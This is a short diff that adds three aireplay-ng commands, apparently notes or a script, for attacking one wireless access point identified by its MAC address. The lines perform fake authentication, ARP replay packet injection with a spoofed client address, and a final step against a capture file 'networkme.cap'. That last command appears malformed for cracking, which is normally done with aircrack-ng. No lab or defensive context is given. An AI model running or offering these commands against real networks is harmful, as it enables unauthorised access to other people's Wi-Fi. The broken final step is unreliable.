@@ -1,0 +1,6 @@
+sudo aireplay-ng -1 0 -a 6C:19:8F:BC:CD:9A wlan0mon
+
+sudo aireplay-ng -3 -b 6C:19:8F:BC:CD:9A -h 66:74:78:e9:76:89 wlan0mon
+
+sudo aireplay-ng -b 6C:19:8F:BC:CD:9A networkme.cap
+
